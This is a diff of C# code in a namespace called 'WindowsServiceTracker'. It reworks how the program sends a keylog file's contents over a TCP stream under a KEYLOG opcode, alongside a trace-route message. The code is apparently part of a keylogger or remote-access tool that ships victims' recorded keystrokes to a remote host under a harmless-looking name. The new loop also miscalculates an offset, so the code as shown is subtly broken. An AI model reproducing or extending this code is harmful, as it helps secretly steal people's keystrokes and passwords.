@@ -360,10 +360,10 @@ namespace WindowsServiceTracker
             if (tcpStream != null && tcpStream.CanWrite)
             {
                 byte[] msg = Encoding.UTF8.GetBytes(ipString + Environment.NewLine);
-                byte[] tempMsg = new byte[msg.Length + 1];
-                tempMsg[0] = TRACE_ROUTE;
-                msg.CopyTo(tempMsg, 1);
-                tcpStream.Write(tempMsg, 0, tempMsg.Length);
+                byte[] combinedMsg = new byte[msg.Length + 1];
+                combinedMsg[0] = TRACE_ROUTE;
+                msg.CopyTo(combinedMsg, 1);
+                tcpStream.Write(combinedMsg, 0, combinedMsg.Length);
                 return true;
             }
             return false;
@@ -430,10 +430,11 @@ namespace WindowsServiceTracker
 
             try
             {
-
+                /*
                 msg = new byte[1];
                 msg[0] = KEYLOG;
                 tcpStream.Write(msg, 0, msg.Length);
+                 */
 
                 // the nested try block is so that when there is no keylog file,
                 // it still sends the opcode and newline char
@@ -441,9 +442,24 @@ namespace WindowsServiceTracker
                 {
                     while (!log.EndOfStream)
                     {
+                        int offset = 0;
+                        byte[] combinedMsg;
                         bytesRead = log.Read(buffer, 0, bufferSize);
                         msg = Encoding.UTF8.GetBytes(buffer, 0, bytesRead);
-                        tcpStream.Write(msg, 0, msg.Length);
+                        byte[] newLine = Encoding.UTF8.GetBytes(Environment.NewLine);
+
+                        combinedMsg = new byte[1 + msg.Length + newLine.Length];
+
+                        combinedMsg[0] = KEYLOG;
+                        offset += 1;
+
+                        msg.CopyTo(combinedMsg, offset);
+                        offset += combinedMsg.Length;
+
+                        newLine.CopyTo(combinedMsg, offset);
+                        offset += newLine.Length;
+
+                        tcpStream.Write(combinedMsg, 0, combinedMsg.Length);
                     }
                 }
                 catch (Exception)
@@ -451,8 +467,10 @@ namespace WindowsServiceTracker
 
                 }
 
+                /*
                 msg = Encoding.UTF8.GetBytes(Environment.NewLine);
                 tcpStream.Write(msg, 0, msg.Length);
+                */
             }
             catch (Exception)
             {
